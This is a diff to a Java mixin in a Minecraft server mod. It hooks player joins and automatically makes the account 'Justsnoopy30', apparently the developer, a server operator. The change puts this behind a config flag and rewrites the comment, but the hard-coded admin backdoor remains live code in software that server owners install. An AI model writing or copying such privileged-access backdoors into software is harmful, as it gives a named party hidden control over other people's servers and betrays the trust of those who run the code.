@@ -1,6 +1,7 @@
 package net.hypercubemc.beacon.mixin;
 
 import com.mojang.authlib.GameProfile;
+import net.hypercubemc.beacon.Mod;
 import net.hypercubemc.beacon.api.events.BeaconPlayerJoinEvent;
 import net.hypercubemc.beacon.api.events.BeaconPlayerLeaveEvent;
 import net.minecraft.network.ClientConnection;
@@ -28,8 +29,8 @@ public abstract class PlayerManagerMixin {
     @Inject(method = "onPlayerConnect", at = @At(value = "TAIL"))
     public void postPlayerJoin(ClientConnection clientConnection, ServerPlayerEntity player, CallbackInfo callbackInfo) {
         GameProfile gameProfile = player.getGameProfile();
-        // Not ready for production yet as warned, use at your own risk (of me being op)
-        if (gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
+        // See config if you want to turn this off
+        if (Mod.getConfig().getNode("op-beacon-dev-on-join").getBoolean() && gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
             this.addToOperators(gameProfile);
         }
         BeaconPlayerJoinEvent.firePost(clientConnection, player);
